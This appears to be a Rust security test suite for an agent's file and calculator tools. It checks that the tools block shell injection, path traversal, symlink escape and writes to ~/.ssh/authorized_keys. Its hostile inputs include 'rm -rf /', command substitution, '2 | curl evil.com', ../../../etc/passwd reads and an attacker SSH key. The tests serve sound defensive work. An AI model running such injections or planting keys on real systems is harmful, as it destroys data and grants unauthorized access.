#[cfg(test)]
mod security_tests {
    use crate::tests::helpers::*;
    use crate::tools::commands::{calculate_tool, read_file_tool, write_file_impl, append_to_file_impl, tail_file_tool};
    use crate::security::path_validator::{PathValidator, validate_path_for_write};
    use std::path::{Path, PathBuf};
    use std::env;
    use std::fs::{self, File};
    use std::io::Write;

    // ===== Calculate Tool Tests =====

    #[tokio::test]
    async fn test_calculate_allows_safe_math() {
        let result = calculate_tool("2 + 2".to_string()).await;
        assert!(result.is_ok(), "Should allow simple math");
    }

    #[tokio::test]
    async fn test_calculate_allows_complex_math() {
        let result = calculate_tool("(10 + 5) * 2 - 8 / 4".to_string()).await;
        assert!(result.is_ok(), "Should allow complex math expressions");
    }

    #[tokio::test]
    async fn test_calculate_blocks_shell_injection() {
        let malicious = vec![
            "2 + 2; rm -rf /",
            "2 + $(whoami)",
            "2 + `whoami`",
            "2 | curl evil.com",
        ];

        for expr in malicious {
            let result = calculate_tool(expr.to_string()).await;
            assert!(result.is_err(), "Should reject malicious expression: {}", expr);
        }
    }

    #[tokio::test]
    async fn test_calculate_blocks_invalid_chars() {
        let result = calculate_tool("2 + 2; ls".to_string()).await;
        assert!(result.is_err(), "Should reject expression with invalid characters");
    }

    // ===== Path Traversal Tests =====

    #[tokio::test]
    async fn test_read_file_blocks_parent_traversal() {
        let result = read_file_tool(
            "../../../etc/passwd".to_string(),
            1000000
        ).await;

        assert!(result.is_err(), "Should reject path with ..");
        let error_msg = result.unwrap_err();
        assert!(is_traversal_error(&error_msg));
    }

    #[tokio::test]
    async fn test_read_file_blocks_absolute_path_outside_home() {
        let result = read_file_tool(
            "/etc/passwd".to_string(),
            1000000
        ).await;

        assert!(result.is_err(), "Should reject absolute path outside home");
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[tokio::test]
    async fn test_write_file_blocks_parent_traversal() {
        let state = new_state();
        let result = write_file_impl(
            "../../../tmp/evil.txt".to_string(),
            "malicious content".to_string(),
            None,
            &state
        ).await;

        assert!(result.is_err(), "Should reject path with ..");
        assert!(is_traversal_error(&result.unwrap_err()));
    }

    #[tokio::test]
    async fn test_write_file_blocks_absolute_path_outside_home() {
        let state = new_state();
        let result = write_file_impl(
            "/tmp/evil.txt".to_string(),
            "malicious content".to_string(),
            None,
            &state
        ).await;

        assert!(result.is_err(), "Should reject absolute path outside home");
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[tokio::test]
    async fn test_append_file_blocks_parent_traversal() {
        let state = new_state();
        let result = append_to_file_impl(
            "../../.bashrc".to_string(),
            "evil command".to_string(),
            None,
            &state
        ).await;

        assert!(result.is_err(), "Should reject path with ..");
        assert!(is_traversal_error(&result.unwrap_err()));
    }

    #[tokio::test]
    async fn test_tail_file_blocks_parent_traversal() {
        let result = tail_file_tool(
            "../../../etc/passwd".to_string(),
            10,
            None
        ).await;

        assert!(result.is_err(), "Should reject path with ..");
        assert!(is_traversal_error(&result.unwrap_err()));
    }

    #[tokio::test]
    async fn test_read_file_allows_valid_home_path() {
        let (_home_guard, _home_dir) = with_test_home();
        let home_dir = env::var("HOME").unwrap();
        let test_file = PathBuf::from(&home_dir).join(".path_traversal_test_file");
        let mut file = File::create(&test_file).unwrap();
        file.write_all(b"test content").unwrap();
        drop(file);

        let result = read_file_tool(
            test_file.to_string_lossy().to_string(),
            1000000
        ).await;

        let _ = fs::remove_file(&test_file);

        assert!(result.is_ok(), "Should allow reading file in home directory");
        assert_eq!(result.unwrap(), "test content");
    }

    #[tokio::test]
    async fn test_write_file_allows_valid_home_path() {
        let (_home_guard, _home_dir) = with_test_home();
        let state = new_state();
        let home_dir = env::var("HOME").unwrap();
        let test_file = PathBuf::from(&home_dir).join(".path_traversal_test_write");

        let result = write_file_impl(
            test_file.to_string_lossy().to_string(),
            "test content".to_string(),
            None,
            &state
        ).await;

        let _ = fs::remove_file(&test_file);

        assert!(result.is_ok(), "Should allow writing file in home directory");
    }

    #[test]
    fn test_path_validator_rejects_dotdot() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir);

        let result = validator.validate(Path::new("../../../etc/passwd"));
        assert!(result.is_err());
        assert!(is_traversal_error(&result.unwrap_err()));
    }

    #[test]
    fn test_path_validator_rejects_absolute_outside_base() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir);

        let result = validator.validate(Path::new("/etc/passwd"));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[test]
    fn test_path_validator_allows_valid_relative_path() {
        let test_dir = setup_test_dir();
        let test_file = test_dir.join("test.txt");
        File::create(&test_file).unwrap();

        let validator = PathValidator::new(test_dir.clone());

        let original_dir = env::current_dir().unwrap();
        env::set_current_dir(&test_dir).unwrap();

        let result = validator.validate(Path::new("test.txt"));

        env::set_current_dir(original_dir).unwrap();

        assert!(result.is_ok());
    }

    #[test]
    fn test_path_validator_tilde_expansion() {
        let (_home_guard, _home_dir) = with_test_home();
        let home_dir = env::var("HOME").unwrap();
        let validator = PathValidator::new(PathBuf::from(&home_dir));

        let test_file = PathBuf::from(&home_dir).join(".path_validator_tilde_test");
        File::create(&test_file).unwrap();

        let result = validator.validate(Path::new("~/.path_validator_tilde_test"));

        assert!(result.is_ok());
        assert_eq!(
            result.unwrap(),
            fs::canonicalize(&test_file).unwrap_or_else(|_| test_file.clone())
        );

        let _ = fs::remove_file(&test_file);
    }

    #[test]
    fn test_path_validator_symlink_escape() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir.clone());

        let symlink_path = test_dir.join("evil_link");
        let target_path = PathBuf::from("/etc/passwd");

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let _ = symlink(&target_path, &symlink_path);

            let result = validator.validate(&symlink_path);

            assert!(result.is_err());
            assert!(result.unwrap_err().contains("Access denied"));
        }
    }

    #[tokio::test]
    async fn test_hidden_traversal_in_middle() {
        let result = read_file_tool(
            "docs/../../../etc/passwd".to_string(),
            1000000
        ).await;

        assert!(result.is_err(), "Should reject hidden traversal in path");
        assert!(is_traversal_error(&result.unwrap_err()));
    }

    #[tokio::test]
    async fn test_write_to_ssh_authorized_keys() {
        let (_home_guard, home_dir) = with_test_home();
        let state = new_state();

        let ssh_dir = home_dir.join(".ssh");
        let _ = fs::create_dir_all(&ssh_dir);
        let auth_keys = ssh_dir.join("authorized_keys");
        File::create(&auth_keys).unwrap();

        let result = write_file_impl(
            auth_keys.to_string_lossy().to_string(),
            "ssh-rsa AAAA... attacker@evil.com".to_string(),
            None,
            &state
        ).await;

        assert!(result.is_err(), "Writing to ~/.ssh/authorized_keys should be blocked");
        assert!(result.unwrap_err().contains("sensitive file"));

        let result2 = validate_path_for_write(&auth_keys);
        assert!(result2.is_err());

        let _ = fs::remove_dir_all(&ssh_dir);
    }
}
